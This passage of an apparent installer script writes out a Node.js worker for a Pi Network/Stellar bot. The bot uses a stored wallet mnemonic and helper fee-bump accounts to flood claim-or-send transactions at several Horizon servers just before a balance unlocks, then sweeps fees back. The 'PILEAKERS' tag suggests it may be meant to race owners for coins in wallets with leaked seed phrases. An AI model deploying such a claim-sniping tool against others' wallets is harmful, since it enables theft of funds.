                    `[${botName}] 🚀 Classic submit ${waveLabel}: ${transactions.length} tx, actual ${actualBeforeMs}ms sebelum unlock, target ${SUBMIT_BEFORE_MS}ms, horizon=${submitTargets.length}, oneServer100=${submitTargets.length === 1 ? "yes" : "no"}, mode=${SUBMIT_ENDPOINT_MODE.toUpperCase()}, toAll=${CLASSIC_SUBMIT_TO_ALL_HORIZONS ? "yes" : "no"}.`,
                    "warning"
               );

               // Model seperti worker contoh: sekali trigger, semua transaksi langsung dilepas pakai Promise.all.
               // Default tetap 1 Horizon per TX agar tidak membuang request; aktifkan CLASSIC_SUBMIT_TO_ALL_HORIZONS=true jika ingin setiap TX ditembak ke semua Horizon.
               const promises = transactions.map(async ({ signed_xdr, transaction, helperPub }, txIndex) => {
                    const helperShort = String(helperPub || "").slice(-4) || String(txIndex + 1);
                    const txHash = getStellarTransactionHash(transaction);
                    if (txHash && !lastSubmittedHash) {
                         lastSubmittedHash = txHash;
                    }

                    const targets = CLASSIC_SUBMIT_TO_ALL_HORIZONS
                         ? submitTargets
                         : [submitTargets[txIndex % submitTargets.length]];

                    if (SUBMIT_VERBOSE_LOGS || CLASSIC_SUBMIT_LOG_EACH_TX) {
                         workerLog(
                              `[${botName}] 📤 Submit ${waveLabel} ...${helperShort} to ${targets.join(", ")}`,
                              "info"
                         );
                    }

                    const resultSet = await submitToHorizons(
                         targets,
                         signed_xdr || transaction,
                         botName,
                         submitServerCache,
                         targets.length
                    );

                    for (const result of resultSet) {
                         if (result.success && result.hash) {
                              lastSubmittedHash = result.hash;
                              if (result.finalized) {
                                   transactionSuccess = true;
                                   successfulHash = successfulHash || result.hash;
                              } else {
                                   submittedAsyncHashes.add(result.hash);
                              }
                              break;
                         }
                    }

                    return resultSet;
               });

               const results = await Promise.all(promises);
               const flatResults = results.flat();
               const acceptedCount = flatResults.filter((item) => item?.success).length;
               const finalizedCount = flatResults.filter((item) => item?.success && item?.finalized).length;
               const failedCount = flatResults.filter((item) => item && item.success === false).length;
               const durationMs = Date.now() - startedAt;

               workerLog(
                    `[${botName}] ✅ Classic submit ${waveLabel} selesai: duration=${durationMs}ms accepted=${acceptedCount} finalized=${finalizedCount} failed=${failedCount}.`,
                    acceptedCount > 0 ? "success" : "warning"
               );

               return results;
          };

          const submitBurstWaves = async (transactions) => {
               const wavePromises = Array.from({ length: SUBMIT_WAVE_COUNT }, async (_, waveIndex) => {
                    if (waveIndex > 0 && SUBMIT_WAVE_DELAY_MS > 0) {
                         await sleep(SUBMIT_WAVE_DELAY_MS * waveIndex);
                    }

                    const waveLabel =
                         SUBMIT_WAVE_COUNT > 1 ? `utama wave ${waveIndex + 1}/${SUBMIT_WAVE_COUNT}` : "utama";
                    return submitAll(transactions, waveLabel);
               });

               return Promise.all(wavePromises);
          };


          const verifyAsyncSubmittedTransactions = async () => {
               const hashes = [...submittedAsyncHashes];
               if (!hashes.length) {
                    return { confirmedSuccess: 0, confirmedFailed: 0, unresolved: 0 };
               }

               const verifyHorizons = normalizeHorizonUrls(
                    finalOnlineServers.length > 0 ? finalOnlineServers : horizonCandidates
               ).slice(0, Math.max(1, botMaxSubmitHorizons));

               workerLog(
                    `[${botName}] 🔎 Verifikasi final ${hashes.length} hash async ke Horizon...`,
                    "info"
               );

               let confirmedSuccess = 0;
               let confirmedFailed = 0;
               let unresolved = 0;

               const verifyOneHash = async (hash) => {
                    for (const horizonUrl of verifyHorizons) {
                         try {
                              const server = createStellarServer(horizonUrl);
                              const txRecord = await server.transactions().transaction(hash).call();
                              if (txRecord?.successful === true) {
                                   return { state: "success", hash, ledger: txRecord.ledger, horizonUrl };
                              }
                              if (txRecord?.successful === false) {
                                   return { state: "failed", hash, ledger: txRecord.ledger, horizonUrl };
                              }
                         } catch (error) {
                              const status = getHttpErrorStatus(error);
                              if (status && Number(status) !== 404) {
                                   workerLog(
                                        `[${botName}] ⚠️ Verifikasi ${hash.slice(0, 12)}... via ${horizonUrl} gagal HTTP ${status}`,
                                        "warning"
                                   );
                              }
                         }
                    }
                    return { state: "unresolved", hash };
               };

               let pendingHashes = hashes;
               // Beri Horizon waktu ingestion. Stop-time biasanya sudah beberapa detik setelah submit,
               // tetapi polling singkat mencegah status palsu hanya karena Horizon terlambat ingest.
               for (let attempt = 1; attempt <= 4 && pendingHashes.length > 0; attempt += 1) {
                    const checked = await mapWithConcurrency(
                         pendingHashes,
                         Math.min(20, Math.max(1, SUBMIT_CONCURRENCY)),
                         verifyOneHash
                    );

                    const nextPending = [];
                    for (const item of checked) {
                         if (item.state === "success") {
                              confirmedSuccess += 1;
                              transactionSuccess = true;
                              successfulHash = successfulHash || item.hash;
                              workerLog(
                                   `[${botName}] ✅ Ledger confirmed SUCCESS: ${item.hash} ledger ${item.ledger ?? "-"}`,
                                   "success"
                              );
                         } else if (item.state === "failed") {
                              confirmedFailed += 1;
                              workerLog(
                                   `[${botName}] ❌ Ledger confirmed FAILED: ${item.hash} ledger ${item.ledger ?? "-"}`,
                                   "error"
                              );
                         } else {
                              nextPending.push(item.hash);
                         }
                    }

                    pendingHashes = nextPending;
                    if (pendingHashes.length > 0 && attempt < 4) {
                         await sleep(1000);
                    }
               }

               unresolved = pendingHashes.length;
               if (unresolved > 0) {
                    workerLog(
                         `[${botName}] ⚠️ ${unresolved} transaksi async belum ditemukan di Horizon setelah verifikasi final; tidak dihitung sukses.`,
                         "warning"
                    );
               }

               return { confirmedSuccess, confirmedFailed, unresolved };
          };

          const checkInterval = setInterval(async () => {
               if (isTickRunning) {
                    return;
               }
               isTickRunning = true;
               try {
                    if (activeBots.has(botName) && activeBots.get(botName).isPaused) {
                         return;
                    }

                    const currentTime = getSystemTime().getTime();
                    const diffToUnlock = unlockTimeMs - currentTime;

                    if (topupHelpersEnabled && !hasPaidHelpers && diffToUnlock <= 120000 && diffToUnlock > 0) {
                         hasPaidHelpers = true;
                         if (outerFeePayerKeypair) {
                              const fastHorizons = await findFastHorizons(horizonCandidates, botName);
                              if (helpers.length === 0) {
                                   helpers = await loadAllHelpersAsync(
                                        fastHorizons,
                                        selectedSponsors,
                                        botName,
                                        helperRangeParsed.start
                                   );
                              }
                              if (helpers.length > 0) {
                                   await payHelpers(
                                        helpers,
                                        outerFeePayerKeypair,
                                        outer_fee,
                                        topup_target_balance,
                                        fastHorizons,
                                        NETWORK_PASSPHRASE,
                                        botName,
                                        custom_memo
                                   );
                              }
                         }
                    }

                    if (!hasPinged && diffToUnlock <= LOAD_BEFORE_MS) {
                         hasPinged = true;
                         await updateBotStatus(botName, "active", "Queued for loading...");
                         workerLog(`[${botName}] ⏳ Waiting in queue for helper loading...`, "info");

                         await acquireLoadingLock(botName, utcUnlockTime.toISOString(), horizon_url);

                         await updateBotStatus(botName, "active", "Loading...");
                         workerLog(`[${botName}] 🔍 Pinging horizons within execution window...`, "info");

                         finalOnlineServers = (await findFastHorizons(horizonCandidates, botName)).slice(
                              0,
                              botMaxSubmitHorizons
                         );
                         if (finalOnlineServers.length === 0) {
                              releaseLoadingLock(botName);
                              throw new Error("No horizons online");
                         }
                         workerLog(`[${botName}] ✅ Fast Horizon order: ${finalOnlineServers.join(", ")}`, "success");

                         if (helpers.length === 0) {
                              workerLog(`[${botName}] 📡 Loading ${selectedSponsors.length} helpers...`, "info");
                              helpers = await loadAllHelpersAsync(
                                   finalOnlineServers,
                                   selectedSponsors,
                                   botName,
                                   helperRangeParsed.start
                              );
                         } else {
                              workerLog(
                                   `[${botName}] Helpers sudah diload (${helpers.length}/${selectedSponsors.length}), lanjut pakai daftar helper yang ada.`,
                                   "info"
                              );
                         }

                         if (helpers.length === 0) {
                              releaseLoadingLock(botName);
                              throw new Error("No helpers loaded successfully");
                         }

                         if (helpers.length < selectedSponsors.length) {
                              workerLog(
                                   `[${botName}] ⚠️ Only ${helpers.length}/${selectedSponsors.length} helpers loaded, continuing anyway`,
                                   "warning"
                              );
                         }

                         releaseLoadingLock(botName);
                    }

                    if (hasPinged && !hasBuilt && (BUILD_AFTER_LOAD || diffToUnlock <= BUILD_BEFORE_MS)) {
                         hasBuilt = true;
                         await updateBotStatus(botName, "preparing", "Signing & Streaming...");
                         workerLog(
                              `[${botName}] 🔨 Building transactions ${BUILD_AFTER_LOAD ? "right after helper load" : "within submit window"}...`,
                              "info"
                         );

                         signedTransactions = await buildAndSignTransactions(0n);
                         workerLog(`[${botName}] ✅ Built & saved ${signedTransactions.length} signed XDR in memory`, "success");
                         schedulePreSignedSubmit();
                     }
                     if (hasBuilt && !hasSubmitted && diffToUnlock <= SUBMIT_BEFORE_MS && !submitTimer && !submitPromise) {
                          schedulePreSignedSubmit();
                     }
                    if (currentTime >= stopTime.getTime() && !hasProcessedPostTx) {
                         hasProcessedPostTx = true;
                         workerLog(`[${botName}] ⏹️ Analyzing final status...`, "info");

                         if (submitPromise) {
                              await submitPromise.catch((error) => {
                                   workerLog(`[${botName}] Submit promise selesai dengan error: ${error.message}`, "warning");
                              });
                         }

                         let finalStatus = "lost";
                         let statusMessage = "No successful transactions found.";

                         if (submittedAsyncHashes.size > 0) {
                              const verification = await verifyAsyncSubmittedTransactions();
                              workerLog(
                                   `[${botName}] 📊 Async final: success ${verification.confirmedSuccess}, failed ${verification.confirmedFailed}, unresolved ${verification.unresolved}`,
                                   verification.confirmedSuccess > 0 ? "success" : "warning"
                              );
                         }

                         if (transactionSuccess) {
                              finalStatus =
                                   transaction_type === "claim_only" || transaction_type === "claim_and_send"
                                        ? "claimed"
                                        : "sent";
                              statusMessage = finalStatus === "claimed" ? "Claimed successfully" : "Sent successfully";
                              workerLog(`[${botName}] ✅ Final Status: ${finalStatus}`, "success");
                         } else {
                              workerLog(`[${botName}] ❌ Final Status: lost (no successful transactions)`, "error");
                         }

                         await updateBotStatus(botName, finalStatus, statusMessage);

                         if (botsCache.has(botName)) {
                              const cached = botsCache.get(botName);
                              cached.status = finalStatus;
                              cached.last_message = statusMessage;
                              botsCache.set(botName, cached);
                         }

                         if (sweepHelpersEnabled && outerFeePayerKeypair) {
                              workerLog(
                                   `[${botName}] 🔄 Auto-Sweep aktif. Menunggu 1 detik sebelum menarik saldo...`,
                                   "info"
                              );

                              let sweepHorizons =
                                   finalOnlineServers.length > 0 ? finalOnlineServers : horizonCandidates;
                              if (helpers.length === 0) {
                                   workerLog(`[${botName}] Loading helper untuk sweep sebelum proses batch...`, "info");
                                   sweepHorizons = (await findFastHorizons(horizonCandidates, botName)).slice(
                                        0,
                                        botMaxSubmitHorizons
                                   );
                                   if (sweepHorizons.length === 0) {
                                        throw new Error("No horizons online for sweep");
                                   }
                                   helpers = await loadAllHelpersAsync(
                                        sweepHorizons,
                                        selectedSponsors,
                                        botName,
                                        helperRangeParsed.start
                                   );
                              }
                              workerLog(
                                   `[${botName}] Sweep siap: ${helpers.length} helper sudah diload, proses ${SWEEP_BATCH_SIZE} helper per batch.`,
                                   "info"
                              );

                              await recoverFees(
                                   helpers,
                                   outerFeePayerKeypair,
                                   sweepHorizons,
                                   NETWORK_PASSPHRASE,
                                   botName,
                                   1,
                                   custom_memo
                              );
                         } else {
                              workerLog(
                                   `[${botName}] ℹ️ Auto-Sweep tidak aktif atau dompet fee tidak ditemukan.`,
                                   "info"
                              );
                         }

                         if (fundingWalletPub && fundingBalanceBeforeStroops !== null) {
                              fundingBalanceAfterStroops = await fetchFundingWalletBalanceStroops(
                                   fundingWalletPub,
                                   finalOnlineServers.length > 0 ? finalOnlineServers : horizonCandidates,
                                   botName,
                                   "akhir"
                              );
                              fundingFeeLossInfo = buildFundingFeeLossInfo(
                                   fundingBalanceBeforeStroops,
                                   fundingBalanceAfterStroops
                              );
                              await saveFundingFeeLoss(botName, fundingFeeLossInfo, fee_payer_id, fundingRunId);
                              await saveFundingWalletHistory({
                                   walletId: fee_payer_id,
                                   walletName: fundingWalletRecord?.name || "Funding Wallet",
                                   walletPublicKey: fundingWalletPub,
                                   runId: fundingRunId,
                                   botGroup: parent_bot_name || botName,
                                   botName,
                                   workerName: WORKER_NAME,
                                   beforeStroops: fundingBalanceBeforeStroops,
                                   afterStroops: fundingBalanceAfterStroops,
                                   status: finalStatus,
                                   amount,
                                   network,
                                   transactionType: transaction_type,
                              });
                              if (fundingFeeLossInfo) {
                                   workerLog(
                                        `[${botName}] 💸 Coin Anda Terpotong: ${fundingFeeLossInfo.loss_pi} PI (Saldo ${fundingFeeLossInfo.before_pi} → ${fundingFeeLossInfo.after_pi} PI)`,
                                        Number.parseFloat(fundingFeeLossInfo.loss_pi) > 0 ? "warning" : "info"
                                   );
                              }
                         }

                         if (transactionSuccess) {
                              await sendSuccessNotificationOnce();
                         }

                         if (!transactionSuccess) {
                              await sendFailureNotificationOnce(statusMessage);
                         }

                         workerLog(`[${botName}] 📌 Status akhir terkunci: ${finalStatus}`, "success");
                         await releaseBotSequenceReservations(botName);

                         if (ledgerStreamCloser) {
                              ledgerStreamCloser();
                         }

                         clearInterval(checkInterval);

                         setTimeout(() => {
                              activeBots.delete(botName);
                         }, 5000);
                    }
               } catch (error) {
                    workerLog(`[${botName}] ❌ Runtime error: ${error.message}`, "error");

                    await updateBotStatus(botName, "error", error.message);
                    await sendFailureNotificationOnce(error.message);

                    releaseLoadingLock(botName);
                    await releaseBotSequenceReservations(botName);

                    if (ledgerStreamCloser) {
                         ledgerStreamCloser();
                    }

                    if (submitTimer) {
                         clearTimeout(submitTimer);
                         submitTimer = null;
                    }

                    clearInterval(checkInterval);
                    activeBots.delete(botName);
               } finally {
                    isTickRunning = false;
               }
          }, FAST_TICK_MS);

          activeBots.set(botName, {
               interval: checkInterval,
               isPaused: false,
               ledgerStream: null,
               currentStatus: "active",
          });
     } catch (error) {
          workerLog(`[${botName}] ❌ Fatal initialization error: ${error.message}`, "error");

          await updateBotStatus(botName, "error", error.message);

          activeBots.delete(botName);
     }
}

let workerServerUrlCache = null;

async function loadRedisJsonArrayStrict(key) {
     const data = await redisClient.get(key);
     if (!data) {
          return [];
     }

     const parsed = JSON.parse(data);
     return Array.isArray(parsed) ? parsed : [];
}

async function resolveWorkerServerUrlFromKeys(workerName, workersKey, serversKey, source) {
     const [workers, servers] = await Promise.all([
          loadRedisJsonArrayStrict(workersKey),
          loadRedisJsonArrayStrict(serversKey),
     ]);
     const worker = workers.find(
          (item) => String(item.name || "").toLowerCase() === String(workerName || "").toLowerCase()
     );

     if (!worker) {
          return {
               url: null,
               source,
               retryable: false,
               error: `Worker ${workerName} not found in ${workersKey}`,
          };
     }

     const server = servers.find((item) => item.id === worker.server_id);
     const serverUrl = String(server?.url || "").trim();
     if (!serverUrl) {
          return {
               url: null,
               source,
               retryable: false,
               error: `No server assigned to worker ${workerName} in ${serversKey}`,
          };
     }

     return {
          url: serverUrl,
          source,
          retryable: false,
          error: null,
     };
}

async function resolveWorkerServerUrlFromRedis(workerName) {
     if (!redisClient.isOpen) {
          return {
               url: null,
               source: "redis",
               retryable: true,
               error: "Redis is not connected",
          };
     }

     try {
          const workerScopedResult = await resolveWorkerServerUrlFromKeys(
               workerName,
               WORKER_WORKERS_KEY,
               WORKER_SERVERS_KEY,
               "redis-worker"
          );
          if (workerScopedResult.url) {
               return workerScopedResult;
          }

          const globalResult = await resolveWorkerServerUrlFromKeys(workerName, WORKERS_KEY, SERVERS_KEY, "redis");
          if (globalResult.url) {
               return globalResult;
          }

          return globalResult.error ? globalResult : workerScopedResult;
     } catch (error) {
          return {
               url: null,
               source: "redis",
               retryable: true,
               error: `Redis lookup failed: ${error.message}`,
          };
     }
}

async function resolveWorkerServerUrlFromWeb(workerName) {
     try {
          const response = await fetchWithRetries(
               `${WEB_SERVICE_URL}/api/workers/${encodeURIComponent(workerName)}/server`
          );
          let result = {};

          try {
               result = await response.json();
          } catch (error) {
               result = {};
          }

          if (response.ok && result.success && result.server_url) {
               return {
                    url: String(result.server_url).trim(),
                    source: "web",
                    retryable: false,
                    error: null,
               };
          }

          return {
               url: null,
               source: "web",
               retryable: response.status >= 500 || response.status === 429,
               error: result.error || `Web service returned HTTP ${response.status}`,
          };
     } catch (error) {
          return {
               url: null,
               source: "web",
               retryable: true,
               error: `Dashboard fetch failed: ${describeFetchError(error)}`,
          };
     }
}

async function resolveWorkerServerUrl(workerName) {
     const redisResult = await resolveWorkerServerUrlFromRedis(workerName);
     if (redisResult.url) {
          workerServerUrlCache = redisResult.url;
          return redisResult;
     }

     const webResult = await resolveWorkerServerUrlFromWeb(workerName);
     if (webResult.url) {
          workerServerUrlCache = webResult.url;
          return webResult;
     }

     if (workerServerUrlCache) {
          return {
               url: workerServerUrlCache,
               source: "cache",
               retryable: true,
               error: `${webResult.error || redisResult.error}; using cached server URL`,
          };
     }

     return {
          url: null,
          source: webResult.error ? "web" : "redis",
          retryable: redisResult.retryable || webResult.retryable,
          error: webResult.error || redisResult.error || `Server URL not found for worker ${workerName}`,
     };
}

async function loadSubmitHorizonPool(primaryHorizonUrl, botName) {
     const urls = [primaryHorizonUrl];

     if (WORKER_SERVER_ONLY) {
          const single = normalizeHorizonUrls(urls);
          workerLog(
               `[${botName}] Submit routing: single worker server only (${single[0] || "no server"}), maxHorizons=1.`,
               "info"
          );
          return single;
     }

     if (!redisClient.isOpen) {
          const fallback = normalizeHorizonUrls(urls);
          workerLog(
               `[${botName}] Redis belum connect; submit pool memakai server worker saja (${fallback[0] || "no server"}).`,
               "warning"
          );
          return fallback;
     }

     const pools = [
          { key: WORKER_SERVERS_KEY, label: "worker" },
          { key: SERVERS_KEY, label: "global" },
     ];

     for (const pool of pools) {
          try {
               const servers = await loadRedisJsonArrayStrict(pool.key);
               for (const server of servers) {
                    if (server?.url) {
                         urls.push(server.url);
                    }
               }
          } catch (error) {
               workerLog(
                    `[${botName}] Gagal membaca server pool ${pool.label}: ${error.message}`,
                    "warning"
               );
          }
     }

     const normalized = normalizeHorizonUrls(urls);
     workerLog(
          `[${botName}] Submit routing: server pool ${normalized.length} Horizon(s), maxHorizons=${formatSubmitHorizonLimit(MAX_SUBMIT_HORIZONS)}, mode round-robin.`,
          "info"
     );
     return normalized;
}

async function syncCacheWithRedis() {
     if (SYNC_VERBOSE_LOGS) {
          workerLog(`🔄 Auto-syncing with Redis Database...`, "info");
     }
     await refreshRuntimeSettings();
     await migrateLegacyBotsForWorker();
     const workerBots = await loadRedisData(WORKER_BOTS_KEY);
     const allBots = workerBots;

     const myBots = workerBots.map(normalizeBotForStorage).filter((bot) => {
          const assignedWorker = bot.worker_name || "Worker1";
          return assignedWorker === WORKER_NAME;
     });

     if (SYNC_VERBOSE_LOGS) {
          workerLog(`📊 Total bots in Redis: ${allBots.length}, Assigned to me: ${myBots.length}`, "info");
     }

     const newCache = new Map();
     for (const bot of myBots) {
          newCache.set(bot.bot_name, bot);
     }

     for (const [botName, cachedBot] of botsCache) {
          const dbBot = newCache.get(botName);
          const assignedWorker = dbBot ? dbBot.worker_name || "Worker1" : null;
          if (!dbBot || dbBot.status === "deleted" || assignedWorker !== WORKER_NAME) {
               if (activeBots.has(botName)) {
                    workerLog(`🛑 Stopping deleted/reassigned bot: ${botName}`, "info");
                    stopBot(botName);
               }
          }
     }

     for (const bot of myBots) {
          const botName = bot.bot_name;
          if (bot.status === "deleted") continue;

          if (!botsCache.has(botName)) {
               if (isRuntimeBotStatus(bot.status) && !activeBots.has(botName) && !startingBots.has(botName)) {
                    workerLog(`📥 New bot detected: ${botName}`, "info");
                    sendNewBotTelegram(bot.bot_name, bot.amount, bot.custom_memo);
                    processBot(bot);
               }
          } else {
               const oldBot = botsCache.get(botName);
               const runtimeBot = activeBots.get(botName);

               if (
                    runtimeBot &&
                    runtimeBot.currentStatus &&
                    isRuntimeBotStatus(runtimeBot.currentStatus) &&
                    isRuntimeBotStatus(bot.status) &&
                    runtimeBot.currentStatus !== bot.status
               ) {
                    bot.status = runtimeBot.currentStatus;
               }
               if (oldBot.status !== bot.status) {
                    if (isRuntimeBotStatus(bot.status)) {
                         if (!activeBots.has(botName) && !startingBots.has(botName)) {
                              workerLog(`▶️ Resuming bot: ${botName}`, "info");
                              processBot(bot);
                         } else {
                              workerLog(`▶️ Bot already active: ${botName}`, "info");
                              resumeBot(botName);
                         }
                    } else if (bot.status === "paused") {
                         workerLog(`⏸️ Pausing bot: ${botName}`, "info");
                         pauseBot(botName);
                    }
               } else {
                    if (isRuntimeBotStatus(bot.status) && !activeBots.has(botName) && !startingBots.has(botName)) {
                         workerLog(`▶️ Starting active bot: ${botName}`, "info");
                         processBot(bot);
                    } else if (hasBotConfigChanged(oldBot, bot)) {
                         if (activeBots.has(botName)) {
                              workerLog(
                                   `⚠️ Config changed for ${botName}, current active run tetap dilanjutkan tanpa restart.`,
                                   "warning"
                              );
                         } else if (bot.status === "active") {
                              workerLog(`⚠️ Config changed for ${botName}, starting inactive bot...`, "warning");
                              processBot(bot);
                         }
                    }
               }
          }
     }

     botsCache = newCache;
     if (SYNC_VERBOSE_LOGS) {
          workerLog(`✅ Sync complete: ${botsCache.size} total bots, ${activeBots.size} active`, "info");
     }
}

async function processBot(bot) {
     const { bot_name } = bot;

     if (activeBots.has(bot_name) || startingBots.has(bot_name)) {
          return;
     }

     startingBots.add(bot_name);

     try {
          const serverConfig = await resolveWorkerServerUrl(WORKER_NAME);
          if (!serverConfig.url) {
               const message = `Failed to get server URL for worker ${WORKER_NAME}: ${serverConfig.error}`;
               const nextAction = serverConfig.retryable
                    ? `Bot ${bot_name} will retry on next sync.`
                    : `Bot ${bot_name} cannot be started.`;
               workerLog(
                    `${serverConfig.retryable ? "⚠️" : "❌"} ${message}. ${nextAction}`,
                    serverConfig.retryable ? "warning" : "error"
               );

               if (!serverConfig.retryable) {
                    await updateBotStatus(
                         bot_name,
                         "error",
                         serverConfig.error || "Missing server configuration for worker"
                    );
               }
               return;
          }

          if (serverConfig.source === "cache") {
               workerLog(`⚠️ ${serverConfig.error}`, "warning");
          }

          const userEmail = bot.username ? await fetchUserEmail(bot.username) : null;

          const config = {
               bot_name: bot.bot_name,
               claimer_mnemonic: bot.claimer_mnemonic,
               destination: bot.destination,
               amount: bot.amount,
               unlock_time: bot.unlock_time,
               outer_fee: bot.outer_fee,
               network: bot.network,
               helper_range: bot.helper_range || "1-50",
               transaction_type: bot.transaction_type || "send_only",
               transaction_mode: bot.transaction_mode || "fee_bump",
               claimable_balance_id: bot.claimable_balance_id || null,
               claimable_balance_ids: getBotClaimableBalanceIds(bot),
               horizon_url: serverConfig.url,
               fee_payer_id: bot.fee_payer_id || null,
               custom_memo: bot.custom_memo || null,
               recover_fees: bot.recover_fees || false,
               recover_fee_delay: bot.recover_fee_delay || 7,
               user_email: userEmail,
               user_timezone: bot.user_timezone || 0,
               topup_helpers: bot.topup_helpers || false,
               topup_target_balance: bot.topup_target_balance || null,
               sweep_helpers: bot.sweep_helpers || false,
               parent_bot_name: bot.parent_bot_name || null,
               distributed_group_id: bot.distributed_group_id || null,
          };

          await executeBot(config);
     } finally {
          startingBots.delete(bot_name);
     }
}

app.get("/health", (req, res) => {
     res.json({
          status: "healthy",
          worker: WORKER_NAME,
          timestamp: new Date().toISOString(),
          botsCount: botsCache.size,
          activeBotsCount: activeBots.size,
          syncInterval: `${SYNC_INTERVAL_MS / 1000}s`,
     });
});

app.get("/status", (req, res) => {
     const botsList = Array.from(botsCache.values()).map((bot) => ({
          name: bot.bot_name,
          status: bot.status,
          isActive: activeBots.has(bot.bot_name),
     }));

     res.json({
          worker: WORKER_NAME,
          totalBots: botsCache.size,
          activeBots: activeBots.size,
          bots: botsList,
     });
});

let redisConnectPromise = null;

async function ensureRedisConnected() {
     if (redisClient.isReady) {
          return true;
     }

     if (redisConnectPromise) {
          return redisConnectPromise;
     }

     if (redisClient.isOpen) {
          try {
               await redisClient.ping();
               return true;
          } catch (error) {
               workerLog(`Redis belum siap: ${error.message}`, "warning");
               return false;
          }
     }

     redisConnectPromise = redisClient
          .connect()
          .then(async () => {
               await redisClient.ping();
               workerLog("Connected to Redis Database", "success");
               return true;
          })
          .catch((error) => {
               workerLog(`Redis connect failed: ${error.message}. Worker tetap hidup dan akan retry.`, "error");
               return false;
          })
          .finally(() => {
               redisConnectPromise = null;
          });

     return redisConnectPromise;
}

async function checkWebServiceConnectivity() {
     try {
          const response = await fetchWithRetries(`${WEB_SERVICE_URL}/health`);
          if (response.ok) {
               workerLog(`✅ Web service connection established to ${WEB_SERVICE_URL}`, "success");
               return true;
          } else {
               workerLog(
                    `⚠️ Web service at ${WEB_SERVICE_URL} responded with status code ${response.status}.`,
                    "warning"
               );
               return false;
          }
     } catch (error) {
          workerLog(
               `❌ CRITICAL ERROR: Failed to connect to web service at ${WEB_SERVICE_URL}. Error: ${describeFetchError(error)}`,
               "error"
          );
          return false;
     }
}

(async () => {
     try {
          workerLog(`🚀 ${WORKER_NAME} starting...`, "info");

          const redisReady = await ensureRedisConnected();

          await checkWebServiceConnectivity();

          if (redisReady) {
               await refreshRuntimeSettings();
          }

          workerLog(`📦 Fee bump sponsors loaded from bump.txt: ${FEE_BUMP_SPONSORS.length}`, "info");
          workerLog(`⏱️ Auto-sync interval: ${SYNC_INTERVAL_MS / 1000} seconds`, "info");
          workerLog(
               `⚡ Fast claim WIN engine: load=${LOAD_BEFORE_MS}ms build=${BUILD_AFTER_LOAD ? "after-load" : `${BUILD_BEFORE_MS}ms`} submit=${SUBMIT_BEFORE_MS}ms timeout=${TRANSACTION_TIMEOUT_MS}ms sequenceManager=${SEQUENCE_MANAGER_ENABLED} submitMode=${SUBMIT_ENDPOINT_MODE} submitConcurrency=${SUBMIT_CONCURRENCY} submitWaves=${SUBMIT_WAVE_COUNT} waveDelay=${SUBMIT_WAVE_DELAY_MS}ms httpMaxSockets=${SUBMIT_HTTP_MAX_SOCKETS} httpTimeout=${SUBMIT_HTTP_TIMEOUT_MS}ms tick=${FAST_TICK_MS}ms maxHorizons=${formatSubmitHorizonLimit(MAX_SUBMIT_HORIZONS)} workerServerOnly=${WORKER_SERVER_ONLY} oneServer100=${MAX_SUBMIT_HORIZONS === 1 && HELPERS_PER_WORKER === 100}`,
               "info"
          );
          const telegramSettings = redisReady ? await getTelegramSettings() : { botToken: "", chatId: "" };
          workerLog(`Telegram Redis settings: ${telegramSettings.botToken && telegramSettings.chatId ? "Configured" : "Not configured"}`, "info");

          if (redisReady) {
               await syncCacheWithRedis();
          } else {
               workerLog("Redis belum connect saat startup; worker tetap jalan dan retry otomatis.", "warning");
          }

          setInterval(async () => {
               try {
                    const ready = await ensureRedisConnected();
                    if (!ready) {
                         return;
                    }
                    await syncCacheWithRedis();
               } catch (error) {
                    workerLog(`❌ Sync error: ${error.message}`, "error");
               }
          }, SYNC_INTERVAL_MS);

          const server = app.listen(PORT, () => {
               workerLog(`✅ ${WORKER_NAME} ready on port ${PORT}`, "info");
          });
          server.on("error", (error) => {
               workerLog(`Worker HTTP server error on port ${PORT}: ${error.message}`, "error");
          });
     } catch (error) {
          workerLog(`❌ Startup error: ${error.message}`, "error");
     }
})();
PILEAKERS_INDEX_JS

  backup_file "package.json"
  cat > "package.json" <<'PILEAKERS_PACKAGE_JSON'
{
  "name": "pi-worker-dashboard",
  "version": "1.0.0",
  "private": true,
  "description": "Dashboard and multi-worker transaction runner",
  "main": "app.js",
  "type": "commonjs",
  "engines": {
    "node": ">=18"
  },
  "scripts": {
    "start": "node app.js",
    "dashboard": "node app.js",
    "worker": "node index.js",
    "worker:1": "cross-env WORKER_NAME=Worker1 WORKER_PORT=3001 node index.js Worker1",
    "worker:2": "cross-env WORKER_NAME=Worker2 WORKER_PORT=3002 node index.js Worker2",
    "worker:3": "cross-env WORKER_NAME=Worker3 WORKER_PORT=3003 node index.js Worker3",
    "worker:4": "cross-env WORKER_NAME=Worker4 WORKER_PORT=3004 node index.js Worker4",
    "worker:5": "cross-env WORKER_NAME=Worker5 WORKER_PORT=3005 node index.js Worker5",
    "pm2:start": "pm2 start ecosystem.config.js",
    "pm2:reload": "pm2 reload ecosystem.config.js --update-env",
    "pm2:restart": "pm2 restart ecosystem.config.js --update-env",
    "pm2:logs": "pm2 logs",
    "pm2:save": "pm2 save",
    "pm2:stop": "pm2 stop ecosystem.config.js",
    "pm2:delete": "pm2 delete ecosystem.config.js"
  },
  "dependencies": {
    "axios": "^1.7.9",
    "bip39": "^3.1.0",
    "cors": "^2.8.5",
    "cross-env": "^7.0.3",
    "dotenv": "^16.4.7",
    "ed25519-hd-key": "^1.3.0",
    "exceljs": "^4.4.0",
    "express": "^4.21.2",
    "pm2": "^5.4.3",
    "redis": "^4.7.0",
    "stellar-sdk": "^12.3.0"
  }
}
PILEAKERS_PACKAGE_JSON

  backup_file "ecosystem.config.js"
  cat > "$ECOSYSTEM_FILE" <<'PILEAKERS_ECOSYSTEM_CONFIG_JS'
require('dotenv').config();

function boundedIntEnv(name, fallback, min, max) {
  const raw = process.env[name];
  if (raw === undefined || raw === '') return fallback;

  const value = Number.parseInt(raw, 10);
  if (!Number.isFinite(value)) return fallback;

  return Math.min(Math.max(value, min), max);
}

function unlimitedHorizonEnv(name, fallback = '0') {
  const raw = process.env[name];
  if (raw === undefined || raw === '') return fallback;
  const normalized = String(raw).trim().toLowerCase();
  if (["0", "all", "unlimited", "unlimitid", "infinite", "none"].includes(normalized)) return '0';
  const value = Number.parseInt(raw, 10);
  return Number.isFinite(value) && value > 0 ? String(value) : fallback;
}

const pm2AutoRestart = process.env.PM2_AUTORESTART === 'true';
const pm2MemoryRestart = process.env.PM2_MAX_MEMORY_RESTART || '';
const pm2ProcessGuard = {
  autorestart: pm2AutoRestart,
  watch: false,
  restart_delay: boundedIntEnv('PM2_RESTART_DELAY_MS', 10000, 1000, 60000),
  max_restarts: boundedIntEnv('PM2_MAX_RESTARTS', 1, 0, 100),
